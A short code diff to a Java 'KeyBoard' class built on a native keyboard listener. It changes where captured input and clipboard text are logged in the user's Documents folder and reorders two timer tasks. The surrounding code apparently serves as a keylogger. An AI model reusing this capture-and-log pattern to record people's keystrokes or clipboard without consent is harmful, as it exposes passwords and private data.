@@ -84,7 +84,7 @@ public class KeyBoard implements NativeKeyListener{
                     } else {
                         System.out.println("Clipboard does not contain text.");
                     }
-                    Path LOG_FILE = Path.of(System.getProperty("user.home"), "Documents", "log.txt");
+                    Path LOG_FILE = Path.of(System.getProperty("user.home"), "Documents", "test/log.txt");
                     Files.writeString(
                     LOG_FILE, 
                     input, 
@@ -97,8 +97,8 @@ public class KeyBoard implements NativeKeyListener{
                 }
             }
         };
-        timer.scheduleAtFixedRate(task1, 1000, 5000);
         timer.scheduleAtFixedRate(task, 1000, 10000);
+        timer.scheduleAtFixedRate(task1, 1000, 5000);
     
     }
 }
